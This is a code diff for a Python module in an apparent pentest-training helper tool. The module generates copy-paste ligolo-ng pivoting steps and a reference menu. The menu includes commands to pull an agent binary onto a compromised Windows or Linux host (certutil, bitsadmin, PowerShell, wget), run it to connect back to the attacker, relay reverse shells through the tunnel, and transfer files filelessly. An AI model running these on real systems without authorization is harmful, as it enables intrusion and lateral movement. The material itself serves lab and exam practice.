@@ -5,7 +5,7 @@ import ipaddress
 import re
 import socket
 import struct
-from dataclasses import dataclass, field
+from dataclasses import dataclass, field, replace
 
 # Build the ligolo-ng pivot workflow as copy-paste command steps. Nabu does NOT run ligolo (it is a
 # tunnelling relay, not a recon tool, and setting up a tun / route needs root) — this is a guided
@@ -25,6 +25,10 @@ LIGOLO_DOCS = "https://docs.ligolo.ng/"
 # "check releases" nudge so a stale reference is obvious. Bump when the commands are re-verified.
 LIGOLO_REF_VERSION = "v0.8"
 LIGOLO_REF_VERIFIED = "2026-07-18"
+# the release the download commands pin to; GitHub asset URLs embed the version, so there is no
+# version-less direct link — bump this from the releases page when a newer build lands.
+LIGOLO_DL_VERSION = "0.8.2"
+_DL_BASE = f"{LIGOLO_GITHUB}/releases/download/v{LIGOLO_DL_VERSION}"
 
 
 @dataclass
@@ -41,6 +45,19 @@ class PivotMethod:
     name: str
     when: str  # one-line "use this when…"
     commands: list[str]
+
+
+@dataclass(frozen=True)
+class RefItem:
+    label: str  # short "what / when to use it"
+    command: str  # the copy-paste line ({ip}/{port} already filled)
+
+
+@dataclass(frozen=True)
+class RefSection:
+    title: str  # section heading (with an emoji for scanning)
+    subtitle: str  # one-line context
+    items: tuple[RefItem, ...]
 
 
 # Quick reference for the OTHER common pivot methods (CPTS: Pivoting, Tunneling & Port Forwarding) —
@@ -160,6 +177,53 @@ def _agent_step(ip: str, port: int, agent_os: str) -> LigoloStep:
     )
 
 
+def _download_step(agent_os: str) -> LigoloStep:
+    # step 0 — grab the binaries off GitHub (one-time). The PROXY runs on Kali; the AGENT goes
+    # pivot host, so its OS/arch must match the target, not your box. URLs embed the pinned version.
+    v = LIGOLO_DL_VERSION
+    cmds = [
+        "mkdir -p ~/ligolo && cd ~/ligolo",
+        f"wget {_DL_BASE}/ligolo-ng_proxy_{v}_linux_amd64.tar.gz    # PROXY (runs on Kali)",
+        f"tar xzf ligolo-ng_proxy_{v}_linux_amd64.tar.gz",
+    ]
+    if agent_os == "windows":
+        cmds += [
+            f"wget {_DL_BASE}/ligolo-ng_agent_{v}_windows_amd64.zip    # AGENT (64-bit Windows)",
+            f"unzip ligolo-ng_agent_{v}_windows_amd64.zip",
+            f"# 32-bit target? swap in ligolo-ng_agent_{v}_windows_386.zip",
+        ]
+    else:
+        cmds += [
+            f"wget {_DL_BASE}/ligolo-ng_agent_{v}_linux_amd64.tar.gz    # AGENT (64-bit Linux)",
+            f"tar xzf ligolo-ng_agent_{v}_linux_amd64.tar.gz && chmod +x agent proxy",
+        ]
+    return LigoloStep(
+        0,
+        "Download ligolo-ng — one time, on Kali",
+        "Kali",
+        cmds,
+        f"Pinned to release v{v}. Newer out? Grab the latest asset names from {LIGOLO_RELEASES} "
+        "and bump the version in the filenames. The proxy is for Kali; the agent must match the "
+        "PIVOT host's OS/arch.",
+    )
+
+
+def _tun_ip_step(ip: str) -> LigoloStep:
+    # step 0.5 — the agent dials back to YOUR VPN IP (tun0), never 127.0.0.1. People miss this.
+    detected = f"Detected tun0 = {ip}. " if ip and ip != "<your-tun0-ip>" else ""
+    return LigoloStep(
+        1,
+        "Find your VPN IP (tun0) — the agent dials this",
+        "Kali",
+        [
+            "ip addr show tun0    # your OSCP-VPN IP — the agent's -connect target",
+            "ip -4 addr show tun0 | grep -oP 'inet \\K[\\d.]+'    # just the IP",
+        ],
+        f"{detected}Use THIS address wherever the steps below say your IP — the agent connects "
+        "back to it across the VPN. If tun0 is missing, your VPN isn't up.",
+    )
+
+
 def build_ligolo_steps(
     kali_ip: str,
     port: int = 11601,
@@ -172,12 +236,15 @@ def build_ligolo_steps(
     agent_os = agent_os if agent_os in ("linux", "windows") else "linux"
     clean = _clean_routes(routes or [])
     steps: list[LigoloStep] = [
+        _download_step(agent_os),
+        _tun_ip_step(ip),
         LigoloStep(
-            1,
+            2,
             "Start the ligolo proxy",
             "Kali",
-            [f"./proxy -selfcert -laddr 0.0.0.0:{port}"],
-            "Listens for the agent (self-signed cert). Leave it running in its own terminal.",
+            [f"cd ~/ligolo && ./proxy -selfcert -laddr 0.0.0.0:{port}"],
+            "Listens for the agent (self-signed cert). Leave it running in its own terminal; "
+            "get the `ligolo-ng »` prompt. Serving + transfer options are in the reference below.",
         ),
         _agent_step(ip, port, agent_os),
     ]
@@ -187,18 +254,19 @@ def build_ligolo_steps(
     console.append(f"tunnel_start --tun {iface}")
     steps.append(
         LigoloStep(
-            3,
+            4,
             "In the ligolo proxy console",
             "ligolo console",
             console,
-            "Pick the agent's session, create the tun, add the route(s), start the tunnel. "
-            "(Older ligolo: the interface auto-creates and you run `start`, not `tunnel_start`.)",
+            "Pick the agent's session, create the tun, add the route(s), start the tunnel. Run "
+            "`ifconfig` in the console to see the agent's internal subnets. (Older ligolo: the "
+            "interface auto-creates and you run `start`, not `tunnel_start`.)",
         )
     )
     if clean:
         steps.append(
             LigoloStep(
-                4,
+                5,
                 "If traffic doesn't route yet (older ligolo)",
                 "Kali",
                 [f"sudo ip route add {route} dev {iface}" for route in clean],
@@ -209,11 +277,150 @@ def build_ligolo_steps(
     scan_target = clean[0] if clean else "<internal_/24>"
     steps.append(
         LigoloStep(
-            len(steps) + 1,
+            0,  # renumbered below
             "Scan the internal network from Nabu",
             "Nabu",
             [f"Scan → Scan a host / range → target: {scan_target}   (enable -Pn)"],
             "Hosts stream into the recon tree + graph, grouped by subnet, pivoted via this host.",
         )
     )
-    return steps
+    # renumber sequentially so the flow always reads 0..N no matter which optional steps are present
+    return [replace(step, n=i) for i, step in enumerate(steps)]
+
+
+def ligolo_reference_sections(
+    kali_ip: str, port: int = 11601, agent_os: str = "linux"
+) -> list[RefSection]:
+    """The 'pick your flavor' menus the linear steps summarise: every way to serve the agent from
+    Kali, pull it onto the target (Windows + Linux), tunnel reverse shells/files back through the
+    pivot, transfer filelessly in a stripped env, and the ligolo console command reference."""
+    ip = (kali_ip or "<your-tun0-ip>").strip() or "<your-tun0-ip>"
+    agent_os = agent_os if agent_os in ("linux", "windows") else "linux"
+    agent = "agent.exe" if agent_os == "windows" else "agent"
+
+    serve = RefSection(
+        "🌐 Serve the agent from Kali (pick one)",
+        "Run in ~/ligolo so the agent binary is in the web root. Pick a port that won't clash.",
+        (
+            RefItem("Python 3 (default)", "python3 -m http.server 8000"),
+            RefItem("Python 2 (old boxes)", "python2 -m SimpleHTTPServer 8000"),
+            RefItem("PHP", "php -S 0.0.0.0:8000"),
+            RefItem("Ruby", "ruby -run -e httpd . -p 8000"),
+            RefItem("busybox (minimal Kali)", "busybox httpd -f -p 8000"),
+            RefItem("updog (upload+download UI)", "updog -p 8000"),
+            RefItem(
+                "SMB share (no HTTP; Windows-friendly)",
+                "impacket-smbserver share . -smb2support",
+            ),
+        ),
+    )
+    win = RefSection(
+        "⬇ Pull the agent onto a WINDOWS target (from your shell)",
+        f"Serve {agent} from Kali first; save to a writable dir like C:\\Users\\Public.",
+        (
+            RefItem(
+                "PowerShell IWR (try first)",
+                f'powershell -c "IWR http://{ip}:8000/{agent} -OutFile C:\\Users\\Public\\{agent}"',
+            ),
+            RefItem(
+                "PowerShell WebClient",
+                f'powershell -c "(New-Object Net.WebClient).DownloadFile('
+                f"'http://{ip}:8000/{agent}','C:\\Users\\Public\\{agent}')\"",
+            ),
+            RefItem(
+                "certutil",
+                f"certutil -urlcache -split -f http://{ip}:8000/{agent} C:\\Users\\Public\\{agent}",
+            ),
+            RefItem(
+                "curl.exe (Win10+)",
+                f"curl http://{ip}:8000/{agent} -o C:\\Users\\Public\\{agent}",
+            ),
+            RefItem(
+                "bitsadmin (certutil blocked)",
+                f"bitsadmin /transfer j /download /priority high "
+                f"http://{ip}:8000/{agent} C:\\Users\\Public\\{agent}",
+            ),
+            RefItem(
+                "SMB copy (with impacket-smbserver)",
+                f"copy \\\\{ip}\\share\\{agent} C:\\Users\\Public\\{agent}",
+            ),
+            RefItem(
+                "Run it (dial back to Kali)",
+                f"C:\\Users\\Public\\{agent} -connect {ip}:{port} -ignore-cert",
+            ),
+        ),
+    )
+    lin = RefSection(
+        "⬇ Pull the agent onto a LINUX target (from your shell)",
+        "Serve agent from Kali first; drop it in /tmp and make it executable.",
+        (
+            RefItem("wget", f"wget http://{ip}:8000/agent -O /tmp/agent && chmod +x /tmp/agent"),
+            RefItem("curl", f"curl http://{ip}:8000/agent -o /tmp/agent && chmod +x /tmp/agent"),
+            RefItem(
+                "Run it (dial back to Kali)", f"/tmp/agent -connect {ip}:{port} -ignore-cert &"
+            ),
+        ),
+    )
+    listeners = RefSection(
+        "🔀 Reverse shells & files THROUGH the tunnel (ligolo console)",
+        "An internal host can't reach your Kali directly — add a listener ON the agent that "
+        "to your Kali, then point the internal target at the agent's IP:port.",
+        (
+            RefItem(
+                "Catch a reverse shell (internal host → agent:9091 → your Kali:443)",
+                "listener_add --addr 0.0.0.0:9091 --to 127.0.0.1:443",
+            ),
+            RefItem(
+                "Serve a file to the internal host (agent:9092 → your Kali:8000)",
+                "listener_add --addr 0.0.0.0:9092 --to 127.0.0.1:8000",
+            ),
+            RefItem("List active listeners", "listener_list"),
+            RefItem(
+                "Then set your payload LHOST to the AGENT internal IP + the listener port 9091",
+                "# e.g. reverse shell -> <agent_internal_ip>:9091 ; catch on Kali: nc -lvnp 443",
+            ),
+        ),
+    )
+    fileless = RefSection(
+        "📦 Fileless transfer (no wget/curl/nc on the pivot)",
+        "base64 the binary on Kali, paste into the shell, decode on the target — survives a hash "
+        "check unlike a corrupt copy/paste of the raw binary.",
+        (
+            RefItem(
+                "On Kali: pack + base64 + copy to clipboard",
+                "tar -caf agent.tar.xz agent && base64 -w0 agent.tar.xz | xclip -sel clip",
+            ),
+            RefItem(
+                "On the target: paste, decode, extract, run",
+                "echo '<PASTE_BASE64>' | base64 -d > agent.tar.xz && tar -xaf agent.tar.xz && "
+                "chmod +x agent && ./agent -connect " + f"{ip}:{port} -ignore-cert &",
+            ),
+            RefItem(
+                "Find routable subnets in a stripped shell",
+                "cat /proc/net/fib_trie ; cat /proc/net/arp ; cat /proc/net/dev",
+            ),
+        ),
+    )
+    console = RefSection(
+        "📟 Ligolo console command reference",
+        "Typed at the `ligolo-ng »` prompt after the agent joins.",
+        (
+            RefItem("Select / switch the agent session", "session"),
+            RefItem("Show the agent's network interfaces (find internal subnets)", "ifconfig"),
+            RefItem("Create the tun interface", "interface_create --name ligolo"),
+            RefItem(
+                "Add a route to an internal subnet",
+                "interface_add_route --name ligolo --route 172.16.1.0/24",
+            ),
+            RefItem(
+                "Start / stop the tunnel", "tunnel_start --tun ligolo    # older: start / stop"
+            ),
+            RefItem(
+                "Add / list / stop a listener (see the tunnel section)",
+                "listener_add · listener_list · listener_stop",
+            ),
+            RefItem("All commands", "help"),
+        ),
+    )
+    order = [serve, win, lin] if agent_os == "windows" else [serve, lin, win]
+    return [*order, listeners, fileless, console]
